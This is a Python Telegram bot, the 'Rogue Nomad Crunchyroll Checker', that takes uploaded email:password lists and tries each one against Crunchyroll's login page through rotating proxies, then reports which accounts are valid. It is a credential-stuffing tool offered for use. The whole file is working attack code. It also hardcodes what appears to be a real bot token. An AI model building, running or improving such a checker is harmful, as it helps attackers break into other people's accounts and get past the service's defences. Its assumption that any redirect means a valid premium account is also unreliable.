#!/usr/bin/env python3
"""
ROGUE NOMAD - CRUNCHYROLL CHECKER
Simple, working, no buttons
"""

import os
import asyncio
import logging
import re
import io
import random
import time
from datetime import datetime
from typing import List, Optional, Dict
from contextlib import asynccontextmanager

from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
import aiohttp
import aiosqlite

# ============================================
# CONFIG
# ============================================
BOT_TOKEN = "8651086980:AAFe43rg62NOceSHi-kdb5gbEK5QRqqr09E"
ADMIN_ID = 1875307475
DATABASE_URL = "rogue_nomad.db"

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ============================================
# DATABASE
# ============================================
INIT_DB = """
CREATE TABLE IF NOT EXISTS proxies (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    proxy TEXT UNIQUE NOT NULL,
    score INTEGER DEFAULT 100,
    failures INTEGER DEFAULT 0,
    alive BOOLEAN DEFAULT 1
);
"""

@asynccontextmanager
async def get_db():
    async with aiosqlite.connect(DATABASE_URL) as db:
        await db.execute(INIT_DB)
        await db.commit()
        yield db

# ============================================
# PROXY MANAGER
# ============================================
class ProxyManager:
    def __init__(self):
        self._cache = []
        self._cache_time = 0
        self._cache_ttl = 60

    async def get_working_proxies(self) -> List[str]:
        if time.time() - self._cache_time < self._cache_ttl and self._cache:
            return self._cache
        async with get_db() as db:
            cursor = await db.execute("SELECT proxy FROM proxies WHERE alive = 1")
            rows = await cursor.fetchall()
            self._cache = [row[0] for row in rows]
            self._cache_time = time.time()
            return self._cache

    async def get_proxy(self) -> Optional[str]:
        proxies = await self.get_working_proxies()
        return random.choice(proxies) if proxies else None

    async def add_proxies_from_text(self, content: str) -> int:
        added = 0
        for line in content.strip().split("\n"):
            line = line.strip()
            if line and not line.startswith("#"):
                proxy = line.replace("http://", "").replace("https://", "").strip()
                if ":" in proxy:
                    async with get_db() as db:
                        await db.execute("INSERT OR IGNORE INTO proxies (proxy) VALUES (?)", (proxy,))
                        await db.commit()
                        added += 1
        self._cache = []
        return added

    async def clear(self):
        async with get_db() as db:
            await db.execute("DELETE FROM proxies")
            await db.commit()
        self._cache = []

proxy_manager = ProxyManager()

# ============================================
# CRUNCHYROLL CHECKER
# ============================================
async def check_crunchyroll(email: str, password: str, proxy: Optional[str] = None) -> Dict:
    try:
        async with aiohttp.ClientSession() as session:
            # Get CSRF token
            async with session.get("https://www.crunchyroll.com/", proxy=proxy, timeout=10) as resp:
                html = await resp.text()
                csrf_match = re.search(r'csrf_token["\s:]+"([^"]+)"', html)
                csrf = csrf_match.group(1) if csrf_match else ""
            # Login
            async with session.post(
                "https://www.crunchyroll.com/login",
                data={"email": email, "password": password, "csrf_token": csrf},
                proxy=proxy,
                allow_redirects=False,
                timeout=10
            ) as resp:
                if resp.status == 302:
                    return {"valid": True, "status": "active", "tier": "premium"}
                return {"valid": False, "status": "invalid"}
    except Exception as e:
        return {"valid": False, "status": "error", "error": str(e)}

# ============================================
# BOT HANDLERS
# ============================================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🔥 Rogue Nomad Crunchyroll Checker\n\n"
        "📌 HOW TO USE:\n"
        "1️⃣ Send a .txt file with proxies (one per line, format: host:port)\n"
        "   OR send text: proxy:host:port (one per line)\n"
        "2️⃣ Then send credentials (email:pass, one per line)\n"
        "3️⃣ I'll check each account using a random proxy from your list\n\n"
        "Commands:\n"
        "/proxies - Show number of working proxies\n"
        "/clear - Delete all proxies\n"
        "/help - Show this message"
    )

async def help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await start(update, context)

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    doc = update.message.document
    if not doc.file_name.endswith(".txt"):
        await update.message.reply_text("❌ Please upload a .txt file.")
        return

    file = await doc.get_file()
    data = await file.download_as_bytearray()
    content = data.decode("utf-8")
    count = await proxy_manager.add_proxies_from_text(content)

    await update.message.reply_text(f"✅ Added {count} proxies. Now send credentials (email:pass, one per line).")

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text

    # Check if it's a proxy line
    if text.startswith("proxy:") or (":" in text and not text.startswith("/")):
        # Could be single proxy or multiple lines
        content = text.replace("proxy:", "").strip() if text.startswith("proxy:") else text
        count = await proxy_manager.add_proxies_from_text(content)
        await update.message.reply_text(f"✅ Added {count} proxies from text.")
        return

    # Otherwise treat as credentials
    lines = [l.strip() for l in text.split("\n") if l.strip()]
    if not lines:
        await update.message.reply_text("❌ No credentials found.")
        return

    proxies = await proxy_manager.get_working_proxies()
    if not proxies:
        await update.message.reply_text("⚠️ No proxies available. Send a proxy file or use proxy:host:port first.")
        return

    status_msg = await update.message.reply_text(f"⏳ Checking {len(lines)} credentials...")

    results = []
    for cred in lines:
        if ":" not in cred:
            continue
        email, password = cred.split(":", 1)
        proxy = await proxy_manager.get_proxy()
        result = await check_crunchyroll(email.strip(), password.strip(), proxy)
        results.append((cred, result))

    valid = [r for r in results if r[1].get("valid")]
    invalid = [r for r in results if not r[1].get("valid")]

    reply = f"✅ Valid: {len(valid)}\n❌ Invalid: {len(invalid)}\n\n"
    if valid:
        reply += "📋 Valid accounts:\n"
        for cred, res in valid[:20]:
            reply += f"• {cred} | {res.get('status', 'active')}\n"
    if invalid:
        reply += "\n❌ Invalid:\n"
        for cred, res in invalid[:10]:
            reply += f"• {cred} | {res.get('status', 'invalid')}\n"
    if len(invalid) > 10:
        reply += f"... and {len(invalid)-10} more invalid."

    await status_msg.edit_text(reply)

async def show_proxies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    proxies = await proxy_manager.get_working_proxies()
    await update.message.reply_text(f"🌐 Working proxies: {len(proxies)}")

async def clear_proxies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await proxy_manager.clear()
    await update.message.reply_text("🗑️ All proxies cleared.")

# ============================================
# MAIN
# ============================================
def main():
    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help))
    app.add_handler(CommandHandler("proxies", show_proxies))
    app.add_handler(CommandHandler("clear", clear_proxies))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))

    logger.info("🚀 Rogue Nomad Crunchyroll Checker is LIVE!")
    app.run_polling()

if __name__ == "__main__":
    main()
